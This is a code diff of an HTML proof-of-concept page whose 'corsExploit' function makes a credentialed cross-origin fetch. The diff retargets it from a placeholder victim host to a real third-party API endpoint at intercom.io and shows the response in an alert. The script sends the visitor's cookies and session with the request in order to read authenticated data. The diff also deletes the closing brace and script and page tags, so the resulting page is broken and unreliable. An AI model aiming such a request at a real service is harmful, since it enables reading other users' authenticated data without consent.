@@ -9,18 +9,14 @@
 
   <script>
     function corsExploit() {
-      fetch('https://victim.com/api/secret', {
+      fetch('https://api-iam.intercom.io/your-endpoint', {
         method: 'GET',
-        credentials: 'include'
+        credentials: 'include' // Ensures cookies/session are sent with the request
       })
       .then(response => response.text())
       .then(data => {
-        alert("Data received: " + data);
+        alert("Data received: " + data); // Display the data from the API
       })
       .catch(err => {
-        alert("Request failed: " + err);
+        alert("Request failed: " + err); // Show error message if request fails
       });
-    }
-  </script>
-</body>
-</html>
